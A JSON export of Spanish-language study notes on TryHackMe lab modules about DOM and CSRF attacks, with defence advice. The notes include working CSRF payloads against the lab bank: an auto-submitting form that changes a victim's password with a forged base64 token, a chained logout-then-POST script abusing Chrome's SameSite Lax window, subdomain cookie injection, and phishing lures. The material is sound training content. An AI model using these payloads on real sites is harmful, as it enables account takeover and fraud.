[
  {
    "title": "1. The DOM Explained",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/3-dom-based-attacks/1-the-dom-explained/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/3. DOM-Based Attacks/1. The DOM Explained.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 3. DOM-Based Attacks",
    "content": "Antes de que profundicemos en ataques basados en DOM, necesitamos explicar lo que es el DOM. DOM se refiere al Document Object Model, que es la interfaz de programación que muestra el documento de web. Cuando haces una petición a una aplicación web, el HTML de respuesta se carga como DOM en el navegador. En esencia, el DOM es la vista de programación de la aplicación web que el usaurio ve en su navegador. Una vez cargado, JavaScript puede interferir con el DOM y hacer actualizaciones a cosas que el usuario ve.El DOM tiene estructura de árbol, permitiendo a los desarrolladores usar JavaScript para buscar o modificar elementos específicos. Veamos un ejemplo práctico.\n\n```html\n<html>\n    <head>\n        <title>Hello World!</title>\n    </head>\n    <body>\n        <h1> Hello Moon! </h1>\n        <p> The earth says hello! </p>\n    </body>\n</html>\n```\n\nSi quieres jugar con el DOM, puedes copiar el código de arriba a un archivo llamado `index.html` y abrirlo usando tu navegador. El elemento `document` siempre es la cabeza del tree. El subtree `html` es donde todo el código HTML de la página cargada vive, la cual es dividida entre `head` y `body`. Puedes ver el DOM usando las herramientas de desarrollador integradas en el navegador.\n\n![[Pasted image 20260218164203.png]]\n\nUsando las herramientas de desarrollador, también podemos interferir con el JavaScript por consola y usar esto para modificar el DOM. Por ejemplo, podríamos crear un nuevo elemento en el DOM usando las siguientes instrucciones:\n\n1. Haz click en el botóon `Console`.\n2. Crea un nuevo párrafo: `const paragraph = document.createElement(\"p\");`\n3. Crea un nuevo nodo de texto: `const data  = document.createTextNode(\"Our new text\");\n4. Añade el texto al nuevo  párrafo: `paragraph.appendChild(data)`\n5. Encuentra el párrafo existente y añádele el nuevo párrafo: `document.getElementsByTagName(\"p\")[0].appendChild(paragraph);`\n6. Tu nuevo texto debería ser cargado como se muestra abajo.\n\n![[Pasted image 20260218164929.png]]\n\nAquí es donde está el poder de los ataques basados en DOM. Si conseguimos inyectar en el DOM, podemos alterar lo que ve el usuario o incluso tomar acciones como el usuario, efectivamente suplantando su identidad. Esto se volvió un problema significativamente mayor con los frameworks de aplicaciones web modernas donde el control sobre el DOM no significa sólo control sobre una sóla página sino persistencia en toda la aplicación web.",
    "modified": "2026-02-19T01:09:18"
  },
  {
    "title": "8. Defence Mechanisms",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/2-csrf/8-defence-mechanisms/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/2. CSRF/8. Defence Mechanisms.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 2. CSRF",
    "content": "CSRF juega un rol crítico para los pentesters, permitiéndoles simular ataques donde los usuarios ejecutan acciones no autorizadas sin querer en sitios confiables. Explotando vulnerabilidades CSRF, los pentesters pueden evaluar la efectividad de las defensas de una aplicación contra peticiones falseadas, identificar agujeros de seguridad potenciales en el manejo de sesiones y evaluar la robustez de las medidas anti-CSRF implementadas.\n\n--------------------------------\n<h2>Pentesters/Red Teamers</h2>\n- **CSRF Testing:** Testear aplicaciones activamente en busca de vulnerabilidades CSRF intentando ejecutar acciones no autorizadas a través de peticiones manipuladas.\n- **Validación de Fronteras:** Evaluar los mecanismos de validación de la aplicación, asegurando que el input del usuario es validado apropiadamente y hay tokens anti-CSRF implementados.\n- **Análisis de Headers de Seguridad:** Evalúa la presencie y efectividad de headers de seguridad, como CORS y referer, para mejorar la seguridad y prevenir diferentes vectores de ataque.\n- **Testeo de Manejo de Sesiones:** Examina los mecanismos de gestión de sesiones de la aplicación, asegurando que los tokens de sesión se generan, transmiten y validan de forma segura.\n- **Escenarios de Explotación CSRF:** Explora varios escenarios de explotación CSRF, como incrustar peticiones en tags de imágenes o explotar endpoints no confiables.\n\n----------------------------------\n<h2>Desarrolladores</h2>\n- **Tokens Anti-CSRF:** Integra tokens anti-CSRF en cada formulario o petición.\n- **Atributo SameSite-Cookie:** Configura el atributo SameSite a Strict o Lax para controlar cuando las cookies se mandan en peticiones cross-site.\n- **Política de Referer:** Implementa una política referer estricta, limitando la información divulgada en el header referer.\n- **Content Security Policy (CSP):** Utiliza CSP para definir y reforzar una política que especifique las fuentes confiadas del contenido, mitigando el riesgo de inyectar scripts maliciosos en las webs.\n- **Patrón de Subida de Cookies Dobles:** Implementa un patrón de doble subida de cookies donde el CSRF se guarde tanto en la cookie como en el parámetro de petición. El servidor comprueba ambos para autentificar las peticiones.\n- **Implementación de CAPTCHAS:** Incorpora retos CAPTCHA como capa adicional de defensa contra ataques CSRF especialmente en la autentificación del usuario, subida de formularios y procesos de creación de cuentas.",
    "modified": "2026-02-19T01:09:18"
  },
  {
    "title": "7. Few Additional Exploitation Techniques",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/2-csrf/7-few-additional-exploitation-techniques/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/2. CSRF/7. Few Additional Exploitation Techniques.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 2. CSRF",
    "content": "<h2>Explotación XMLHttpRequest</h2>\nEn el contexto de una petición AJAX, CSRF es como si alguien estuviera haciendo que tu navegador mandara una petición sin saberlo a una web en la que estás logueado. Es como si alguien engañara a tu navegador para hacer algo en un sitio confiado por ti sin que lo supieras, potencialmente causando acciones no intencionadas o cambios en tu cuenta. Los ataques CSRF pueden resultar exitosos incluso cuando las peticiones AJAX están sujetas a [Same-Origin Policy (SOP)](https://en.wikipedia.org/wiki/Same-origin_policy), lo que suele prohibir las peticiones cross-origin.\n\n![[Pasted image 20260218113136.png]]\n\nAquí tienes un ejemplo de cómo un atacante puede actualizar una contraseña en `mybank.thm` y mandar una petición asíncrona para actualizar el email a la vez.\n\n```javascript\n<script>\n\tvar xhr = new XMLHttpRequest();\n\txhr.open('POST', 'http://mybank.thm/updatepassword', true);\n\txhr.setRequestHeader(\"X-Requested-With\", \"XMLHttpRequest\");\n\txhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n\txhr.onreadystatechange = function () {\n\t\tif (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {\n\t\t\talert(\"Action executed!\");\n\t\t}\n\t};\n\txhr.send('action=execute&parameter=value');\n</script>\n```\n\nLa XMLHttpRequest en el código de arriba está diseñada para subir un formulario de información al servidor e incluir headers personalizados. El proceso completo de mandar peticiones será único ya que las peticiones se realizan en JavaScript usando AJAX.\n\n--------------------------------\n<h2>Same Origin Policy (SOP) y Cross-Origin Resource Sharing (CORS) Bypass</h2>\nEl bypasseo de CORS y SOP para lanzar un CSRF es como un atacante usando un truco para hacer que tu navegador mande peticiones a diferentes sitios web en los que estás. Bajo una política CORS errónea, ciertas peticiones podrían ser subidas por orígenes reconocidos. Sin embargo, las configuraciones erróneas en las políticas CORS pueden permitir a los atacantes circunvalar estas limitaciones si confían en orígenes que el atacante puede controlar o si las credenciales son incluidas en peticiones en peticiones cross.origin.\n\n```php\n<?php // Server-side code (PHP)\n header('Access-Control-Allow-Origin: *'); \n// Allow requests from any origin (vulnerable CORS configuration) .\n..// code to update email address ?>\n```\n\nEste es un script simple en PHP del lado del servidor que maneja las peticiones POST. Tiene una configuración de CORS vulnerable (`Access-Control-Allow-Origin:*`), permitiendo peticiones de cualquier origen, siendo vulnerable a CSRF ya que no implementa medidas anti-CSRF. El uso de este header depende del caso de uso y requerimientos. Hay escenarios donde permitir peticiones de diferentes orígenes es necesario y legítimo, como en APIs públicas o redes de distribución de contenido. Sin embargo, es crucial considerar cuidadosamente las implicaciones en cuanto a seguridad y asegurar que **Access-Control-Allow-Credentials** esté bien configurado para aceptar sólo orígenes confiables. Es importante saber que `Access-Control-Allow-Origins:*` y `Access-Control-Allow-Credentials:true` no pueden ser usados juntos por restricciones de seguridad impuestas por la [Especificación de CORS](https://fetch.spec.whatwg.org/#cors-protocol-and-credentials).\n\n-------------------------------------\n<h2>Referer Header Bypass</h2>\nAl hacer peticiones HTTP, el header referer contiene el URL de la última página que el usuario visitó antes de hacer la petición actual. Algunos sitios web se protegen contra CSRF permitiendo sólo las queries si el header referer coincide con su dominio. La utilidad de esto como protección única contra CSRF se reduce cuando este header se modifica o se cambia, como ocurre con las extensiones de navegador instaladas por el usuario, herramientas de privacidad o etiquetas meta que le dicen al servidor que omitan el referer.",
    "modified": "2026-02-19T01:09:18"
  },
  {
    "title": "6. Samesite Cookie Bypass",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/2-csrf/6-samesite-cookie-bypass/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/2. CSRF/6. Samesite Cookie Bypass.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 2. CSRF",
    "content": "<h2>Vista Previa</h2>\nProfundicemos en el mecanismo crucial de defensa conocido como cookies SameSite. Estas cookies vienen con un atributo especial diseñado para controlar cuándo se mandan con peticiones cross-site. Implementar esta propiedad es una manera confiable de protegerse contra filtraciones de información de cross-origin, CSRF y XSS. Dependiendo del contexto de la petición, le dice al navegador cuándo transmitir la cookie. Los tres valores potenciales son **Strict**, **Lax** y **None**.\n\nEl nivel de protección más alto es strict, que garantiza que la cookie sólo se manda si la petición viene del mismo origen que la cookie. Lax permite el uso de la cookie en orígenes cruzados por especificación.\n\n------------------------------------\n<h2>Diferentes Tipos de Cookies SameSite</h2>\n- **Lax:** Las cookies SameSite Lax son como un vecindario amigable. Ofrecen un nivel de protección moderado permitiendo cookies ser mandadas en niveles altos de navegación y métodos HTTP seguros, como GET, HEAD y OPTIONS. Esto implica que no serán mandadas en peticiones cross-origin con POST, ayudando a mitigar cierto tipo de ataques CSRF. Sin embargo, siguen estando presentes en peticiones GET iniciadas por sitios web externos, lo que puede suponer un riesgo si se guarda información sensible en las cookies.\n- **Strict:** Las cookies SameSite Strict actúan como guardias de seguridad. Ofrecen el nivel más alto de protección restringiendo las cookies para que sólo se puedan mandar por el propietario. Esto significa que las cookies sólo se mandan con peticiones que se originan del mismo sitio que configuró la cookie, previniendo efectivamente los ataques CSRF.\n- **None:** Las cookies SameSite None se comportan como trotamundos sin responsabilidades. Se mandan tanto como por el propietario como en peticiones cross-site, haciéndolas convenientes para escenarios donde las cookies necesitan ser accesibles a lo largo de diferentes orígenes. Sin embargo, para prevenir riesgos de seguridad potenciales asociados con esta configuración, las cookies None requieren del atributo Secure en true para que la petición se haga a través de HTTPS. Esto asegura que las cookies sólo se mandan en conexiones seguras.\n\n-------------------------------------\n<h2>La Aventura de Explotación Lax</h2>\n- Ahora que el atacante puede acceder a la cuenta del banco de Josh, su objetivo principal es cerrale su sesión para que no pueda hacer más transacciones.\n- Ha visto una cookie logout que se configura una vez que hace login, esta cookie está configurada como Lax, lo que significa que se mandará en todas las navegaciones de alto nivel con peticiones como GET.\n\n![[Pasted image 20260217125527.png]]\n\n- Aquí está el código del lado del servidor que valida la cookie y comprueba su valor. Basado en ese valor, el código cierra la sesión del usuario.\n\n```php\n<?php\n$cookieNames = array_keys($_COOKIE);\nif($_COOKIE[\"logout\"] == \"xxxxxxx\"){\n\t// Loop through each cookie and delete it\nforeach ($cookieNames as $cookieName) {\n// If it's desired to kill the session, also delete the session cookie.\nsession_destroy();\n..\n...\n}\n```\n\n- El script requiere un valor de cookie, pero depende por completo del tipo de valor de SameSite. Como está en Lax, no será reenviada a peticiones cross-site a excepción del alto nivel de navegación y peticiones GET.\n- Para cerrarle la sesión a Josh, el atacante puede mandar un email, haciéndose pasar por un representador del banco y persuadiéndolo para que participe en una encuesta para ganar un premio.\n\n![[Pasted image 20260218100231.png]]\n\n- Ve a `mailbox.thm:8081` y abre el mail con la insignia roja titulado \"Exclusive Opportunity: Complete Our Survey for a Chance to Win a Ferrari!\".\n\n![[Pasted image 20260218102115.png]]\n\n- Verás que el payload CSRF de logout está construido usando el siguiente payload:\n\n```html\n<a href=\"https://mybank.thm:8080/logout.php\" target=\"_blank\">Survey Link!</a>\n```\n\n- El atacante debe hacer una simple petición GET a `logout.php`, ya que la cookie está configurada como Lax.\n- Como la cookie proviene de una fuente verificada y la cookie de logout también está configurada, Josh será expulsado de su sesión y no podrá volver a iniciar sesión (ya que cambiamos su contraseña en la tarea anterior).\n\n--------------------------------------\n<h2>¿Cuál es el Link Faltante?</h2>\n- El desarrollador del MyBank LLC no consideró el atributo SameSite para las cookies al escribir el código. El ataque hubiera podido ser evitado si el atributo SameSite hubiera sido configurado como Strict en vez de Lax.\n- Además, como pentester es esencial analizar cada atributo de la cookie configurada por el dominio. La mayoría del tiempo, pequeños errores de desarrollo en programación causan avenidas abiertas de explotación en una aplicación aparentemente segura.\n\n-----------------------------------------\n<h2>Escenario Lax con POST - Encadenando el Exploit</h2>\nComo pentester, es importante comprobar las cookies que son mandadas por el sitio web. Como la cookie configurada en el ejemplo anterior era Lax, era posible cerrar la sesión de cualquier usuario. Pero ese escenario es posible sólo con peticiones GET y no se puede hacer nada en caso de peticiones POST.\n\nInicialmente, cuando el atributo SameSite fue introducido para incrementar la seguridad web restringiendo cómo se mandan las cookies en peticiones cross-site, Google Chrome y otros navegadores no reforzaron un comportamiento por defecto para cookies sin el atributo SameSite especificado. Sin embargo, con el tiempo, Google Chrome cambió esto e hizo que el valor por defecto si no se especificaba explícitamente de otra forma, fuera `SameSite=Lax`.\n\nPero ¿qué pasa si queremos hacer una petición POST? ¿Podemos hacer algo? La respuesta es sí. Como pone en la documentación de [Chrome](https://chromestatus.com/feature/5088147346030592):\n\n>[!QUOTE] _\"Chrome will make an exception for cookies set without a SameSite attribute less than **2 minute**s ago. Such cookies will also be sent with non-idempotent (e.g. POST) top-level cross-site requests despite normal SameSite=Lax cookies requiring top-level cross-site requests to have a safe (e.g. GET) HTTP method.\"_\n\nPor lo que cualquier cookie que no esté configurada con el atributo SameSite y si el servidor lee o modifica la cookie será mandada en peticiones cross-site hasta que dicha cookie cumpla dos minutos de vida. Después de esos dos minutos pasará a ser tratada como Lax.\n\nDespués de revisar el código, podemos ver que hay una cookie `isBanned` que se configura después de iniciar sesión. El valor de dicha cookie determina si el usuario es banneado o no y le muestra un mensaje. Nuestro objetivo es cambiar el valor de la cookie una vez que el usuario hace click en el link malicioso. Aquí está el código del lado del servidor que realiza la validación.\n\n```php\nif (!isset($_COOKIE['isBanned'])) { echo('&#60;script&#62;alert(\"isBanned cookie not found in request\");&#60;/script&#62;'); \texit(); }\nif (isset($_POST['isBanned'])) {\n\t$status=$_POST['isBanned'];\n     echo('<script>document.cookie=\"isBanned='.$status.'\";</script>'); \n}\n```\n\n- Hay una llamada POST API a `index.php` que acepta un parámetro `isBanned` y configura el valor de la cookie. Sin embargo, el código del lado del servidor espera la cookie para evitar ataques CSRF.\n- Si hay alguna petición cross-site a la página, no podemos ejecutar el script para crear la cookie directamente, ya que no habrá una cookie `isBanned` en nuestra petición.\n- Probemos lo siguiente. Iniciamos sesión usando `GB82MYBANK5699:GB82MYBANK5697`. Al iniciar sesión, el valor de `isBanned` será actualizado, por lo que necesitamos esperar dos minutos.\n- Después de dos minutos, abrimos el email llamado LAX+POST.\n\n![[Pasted image 20260218105334.png]]\n\n- Este email consiste de dos botones. El primero hará una petición POST a `index.php` para actualizar el valor `isBanned` de la cookie.\n- El primer botón usa el código:\n\n```javascript\n<script>\nfunction launchAttack(){ setTimeout(function(){bank.submit()},1000)\n}\n</script>\n<form style=\"display:none\" name=\"bank\" \nmethod=post action=\"http://mybank.thm:8080/index.php\">\n<input name=\"isBanned\" value=\"true\">\n<input type=\"submit\">\n</form>\n```\n\n- Haz click en el botón y mira lo que pasa:\n\n![[Pasted image 20260218105455.png]]\n\n- Esto pasa porque la cookie `isBanned` no fue redirigida por el buscador durante la petición.\n- ¿Cuál es la solución aquí? Podemos explotar la funcionalidad de que Chrome manda las cookies en una petición web si han sido modificadas en los últimos dos minutos. Como pentester es esencial entender cada petición y respuesta. La cookie `isBanned` es actualizada en dos instancias, una durante el login y la otra durante el logout.\n- Podemos encadenar el proceso para asegurarnos de que el usuario visita el link de logout. Una vez que haya cerrado la sesión y la cookie `isBanned` sea actualizada, tenemos una ventana de 2 minutos para llamar a `index.php`. para actualizar el valor de `isBanned`.\n- Aquí está el código que hace que el usuario cierre sesión y hace una llamada a `index.php` con el valor de `isBanned` actualizado.\n\n```javascript\n<script>\nfunction launchAttackSuccess(){\nlet win = window.open(\"http://mybank.thm:8080/logout.php\",'');\nsetTimeout(function(){win.close();bank.submit()},1000)\n}\n</script>\n<form style=\"display:none\" name=\"bank\" \nmethod=post action=\"http://mybank.thm:8080/index.php\">\n<input name=\"isBanned\" value=\"true\">\n<input type=\"submit\">\n</form> \n```\n\n- Haz click en el botón de `Successful Attack` el cual primero cerrará la sesión del usuario y luego hará una petición POST a `index.php` y actualizará el valor de `isBanned`. Chrome redirigirá la cookie en la petición ya que ha sido actualizada hace menos de dos minutos.",
    "modified": "2026-02-19T01:09:18"
  },
  {
    "title": "5. Double Submit Cookie Bypass",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/2-csrf/5-double-submit-cookie-bypass/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/2. CSRF/5. Double Submit Cookie Bypass.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 2. CSRF",
    "content": "<h2>Vista Previa</h2>\nHemos observado que sin tokens CSRF, la aplicación web del banco era susceptible a vulnerabilidades, exponiéndolo a potencial explotación. Sin embargo, la introducción de tokens CSRF mejora significativamente la seguridad.\n\nUn token CSRF es un valor único e impredecible asociado a la sesión de un usuario, asegurando que cada petición viene de una fuente legítima. Una implementación efectiva es la técnica de subida doble de cookies, donde un valor de cookie corresponde a un valor en un campo de formulario hidden. Cuando el servidor recibe una petición, comprueba que el valor de la cookie coincida con el del campo, dando una capa de seguridad extra.\n\n---------------------------------------\n<h2>¿Cómo Funciona?</h2>\n- **Generación de Token:** Cuando un usuario inicia sesión, el servidor genera un token CSRF único. Este token es mandado al navegador del usuario como cookie y campo hidden del formulario web donde se realiza la acción.\n- **Acción del Usuario:** El usuario rellena el formulario, el cual contiene el campo escondido con el token CSRF.\n- **Subida de Formulario:** Al subir el formulario dos versiones del token CSRF son mandadas, una en la cookie y la otra como parte de la información del formulario.\n- **Validación de Servidor:** El servidor comprueba que el token CSRF en la cookie coincide con el mandado en el formulario. Si coincide, la petición se considera legítima y se procesa; si no, se rechaza.\n\n---------------------------------\n<h2>Escenarios Posiblemente Vulnerables</h2>\nA pesar de su efectividad, es crucial reconocer que los hackers son persistentes y han identificado varios métodos para bypassear el Double Submit Cookies:\n\n- **Secuestro de Cookie de Sesión (MITM Attack):** Si el token CSRF no está aislado correctamente y guardado de la sesión, un atacante podría acceder a él de alguna forma.\n- **Subversión de la Política del Mismo Origen (Subdominio Controlado por el Atacante):** Un atacante puede configurar una situación donde la política de same origin del navegador se rompa.\n- **Explotar Vulnerabilidades XSS:** Un atacante puede obtener el token CSRF de una cookie o página si la aplicación web es susceptible de XSS.\n- **Predecir o Interferir con la Generación de Tokens:** Un atacante puede adivinar o modificar el token CSRF si los tokens no se generan de forma segura y son predecibles o si pueden alterar el proceso de generación de tokens.\n- **Inyección de Cookies de Subdominio:** Inyectar cookies en el navegador de un usuario desde un subdominio relacionado es otra técnica sofisticada que puede ser usada.\n\n--------------------------------------\n<h2>¿Cómo Funciona?</h2>\nAhora veremos cómo funciona el ataque, conectándolo al ejemplo anterior. Esta técnica encadena dos escenarios vulnerables invirtiendo la generación de token e inyectando una cookie a través de un subdominio controlado por el atacante.\n\n- El atacante ha transferido de forma exitosa la cantidad de dinero de la cuenta de Josh pero es más avaricioso y quiere tomar control completo de otra cuenta de banco.\n- Para explotar la cuenta, el atacante debe acceder a la cuenta, ¿pero cómo? Requiere la contraseña de la cuenta de Josh.\n- Explotar una vulnerabilidad como CSRF requiere bastante entendimiento de código y funcionalidad de la lógica del servidor desde el punto de vista del desarrollador. El atacante inicia sesión en su cuenta de banco y nota que el formulario de subida para actualizar contraseñas está protegido por un token CSRF.\n\n```html\n<form method=\"post\" action=\"\">\n        <label for=\"password\">Password:</label>\n        <input type=\"password\" id=\"password\" name=\"new_password\" required>\n\n        <label for=\"confirm_password\">ConfirmPassword:</label>\n        <input type=\"password\" id=\"confirm_password\" name=\"confirm_password\" required>\n\t\t<input type=\"hidden\" id=\"csrf_token\" name=\"csrf_token\" value=\"<?php echo $_COOKIE['csrf-token']; ?>\">\n        <button type=\"submit\" name=\"password_submit\" >Update Password</button>\n    </form>submit\">\n</form> \n```\n\n- Pero ¿resuelve eso el problema? Un atacante sólo puede bypassear esta medida de seguridad si encuentra una manera de hacerle ingeniería inversa al token.\n- Abre la consola de `Inspeccionar elemento` del navegador para verificar cookies creadas localmente por la web.\n\n![[Pasted image 20260216121529.png]]\n\n- Los atacantes identificaron dos cookies relevantes en el navegador: `csrf-token` y `PHPSESSID`. Típicamente, `PHPSESSID` se genera aleatoriamente por el motor de PHP y no es fácil de revertirlo. Por eso el atacante coge el csrf-token y lo intenta con él.\n- Usa Cyberchef para ver si puede decodearlo, y sorprendentemente sí puede.\n\n![[Pasted image 20260216121751.png]]\n\n- Nota que la string decodeada era su número de cuenta, significando que el desarrollador de la aplicación web necesitaba haber implementado tokens csrf mejor para evitar la explotación.\n\nSabemos que el atacante ya tiene accedo a `mybank.thm` por lo que puede inyectar la cookie falsa, es hora de preparar el payload.\n\n<h4>Preparando el Payload</h4>\n- Para que el ataque funcione, el atacante debería usar una técnica de ingeniería social para hacer que la víctima haga click en un link.\n- El atacante preparará un email para hacer que el usuario cambie su contraseña. Preparó un email citando un intento de login sospechoso al email de Josh y se lo mandó.\n\n![[Pasted image 20260216122354.png]]\n\n- El email contenía un link a un subdominio controlado por el atacante (`attacker.mybank.thm`) con un formulario de actualización de contraseña similar al del banco. El formulario también tenía un token CSRF configurado como parámetro hidden.\n\n```html\n<form method=\"post\" action=\"http://mybank.thm:8080//changepassword.php\" id=\"autos\">\n    <label for=\"password\">Password:</label>\n    <input type=\"password\" id=\"password\" name=\"current_password\" value=\"<?php echo \"GB82MYBANK5697\" ?>\" required>\n\n    <label for=\"confirm_password\">ConfirmPassword:</label>\n    <input type=\"password\" id=\"confirm_password\" name=\"confirm_password\" value=\"Attacker Unique Password\" required>\n\t<input type=\"hidden\" id=\"csrf_token\" name=\"csrf_token\" value=\"Decrypted Token Value\">\n\t\t\n\n\t<button type=\"submit\" name=\"password_submit\"  id=\"password_submit\" >Update Password</button>\n</form>\n\t\n</div>\n\t<script>\n\t\tdocument.getElementById('password_submit').click(); \n\t</script>\n        \n```\n\n- En el código de arriba, el atacante actualizará el payload y añadirá el valor en base64 de la cuenta del banco de Josh como nuevo token CSRF.\n- Navega hasta el correo de Josh (`mailbox.thm:8081`) para ver el nuevo email del payload CSRF.\n\n![[Pasted image 20260216122716.png]]\n\n- Una vez que hagas click en el link, te redirigirá al subdominio controlado por el atacante. El atacante contiene un código similar al de cambiar la contraseña de `mybank.thm`. Sin embargo, también está configurando una cookie con el siguiente código para que sea redirigido al dominio principal.\n\n```php\n<?php\n...\nsetcookie(\n    'csrf-token',               \n    base64_encode(\"GB82MYBANK5699\"),            \n    [\n        'expires' => time() + (365 * 24 * 60 * 60), \n        'path' => '/',                         \n        'domain' => 'mybank.thm',                          \n        'secure' => false,                      \n        'httponly' => false,                 \n        'samesite' => 'Lax' \n    ]\n);\n?>\n```\n\n- El atacante sabe el parámetro hidden y el formulario subirá la información, incluyendo los campos hidden, a la página original de cambio de contraseña. Veamos qué pasa del lado del servidor.\n\n```php\n<?php\nif (base64_decode($_POST[\"csrf_token\"]) == base64_decode($_COOKIE['csrf-token'])) { \n// Retrieve form data\n$currentPassword = $_POST[\"current_password\"];\n$newPassword = $_POST[\"confirm_password\"];\n// Update Password\n...;\n```\n\n- Como vemos arriba, el servidor decodea el token CSRF y lo compara con el valor de la cookie. El servidor considera la petición legítima si viene de un usuario logueado y el token CSRF es válido.\n\n![[Pasted image 20260216123345.png]]\n\n----------------------------------\n<h2>¿Cuál es el Link Faltante?</h2>\nEl script del lado del servidor validó correctamente al usuario. Sin embargo, el token CSRF era  fácil de predecir y por lo tanto el atacante pudo lanzar un ataque de CSRF construido.\n\n----------------------------------\n<h2>Securizando la Brecha</h2>\n- Desde la perspectiva del pentester, es esencial validar el flujo completo de petición/respuesta, comprobar por doble partida si los parámetros tienen alguna vulnerabilidad como tokens fácilmente adivinables.\n- Desde la perspectiva del desarrollador, asegurar que los métodos de generación de tokens sean únicos y difíciles de adivinar.\n- El equipo IT del banco rápidamente identificó el problema y actualizó la generación de tokens para que fueran único y difíciles de adivinar.\n- Abre la bandeja de entrada de Josh y ve hasta el email con la insignia verde.\n\n![[Pasted image 20260216124039.png]]\n\n- Usar el mismo payload no funcionará porque el servidor ha implementado correctamente tokens CSRF seguros e impredecibles.\n\n![[Pasted image 20260216124124.png]]",
    "modified": "2026-02-17T01:07:28"
  }
]